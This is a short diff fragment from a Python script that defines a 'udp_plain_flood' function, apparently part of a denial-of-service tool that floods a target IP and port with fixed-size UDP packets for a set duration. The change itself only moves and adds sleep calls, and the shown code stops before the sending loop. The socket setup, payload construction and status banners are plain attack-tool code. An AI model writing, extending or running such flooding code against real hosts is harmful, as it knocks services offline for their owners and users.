@@ -22,11 +22,12 @@ print("""
 def udp_plain_flood(ip, port, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-    time.sleep(0.2)
     packet_count = 0
+    time.sleep(0.2)
     payload = b"A" * packet_size  # Fixed payloaf
         
     print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
+    time.sleep(0.2)
     print("\033[103m \033[44m0bject \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
     
     try:
